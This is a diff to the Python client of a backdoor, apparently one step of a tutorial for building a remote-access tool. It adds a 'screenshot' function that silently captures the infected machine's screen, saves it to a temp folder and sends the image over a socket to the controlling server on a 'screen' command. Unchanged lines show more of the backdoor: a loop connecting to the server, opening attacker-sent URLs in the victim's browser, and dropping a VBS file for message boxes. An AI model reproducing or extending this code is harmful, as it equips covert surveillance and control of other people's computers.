@@ -19,6 +19,7 @@ import subprocess
 import threading
 from wmi import WMI
 import webbrowser
+import pyscreeze
 
 
 import win32api
@@ -112,7 +113,23 @@ send = lambda data: objSocket.send(data)
 # Step 8: Connect to Server Implement Main Loop for Connect Client to Server
 server_connect()
 
-# Step 21: Define `MessageBox()` Function to Show Received Message from the Server
+# Step 27: Define `screenshot()` Function to Get Screenshot from Client
+def screenshot():
+    # Take screenshot from Client
+    screenshotPath = TMP + "/s.png"
+    pyscreeze.screenshot(screenshotPath)
+
+    # Send Byte Size of Screenshot and msg to Server
+    send(str.encode(f"Receiving screenshot:\nFile Size: {str(path.getsize(screenshotPath))} bytes.\nPlease Wait..."))
+
+    # Open the Screenshot and send it to Server
+    with open(screenshotPath, 'rb') as pic:
+        sleep(1)
+        send(pic.read())
+
+
+
+# Define `MessageBox()` Function to Show Received Message from the Server
 def MessageBox(message):
     objVBS = open(TMP + "/m.vbs", "w")
 
@@ -142,6 +159,9 @@ while True:
             # --o, Open received URL from the Backdoor server in Backdoor Client Browser
             elif strData[:4] == 'site':
                 webbrowser.get().open(strData[4:], new=2)
+                
+            elif strData == 'screen':
+                screenshot()
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
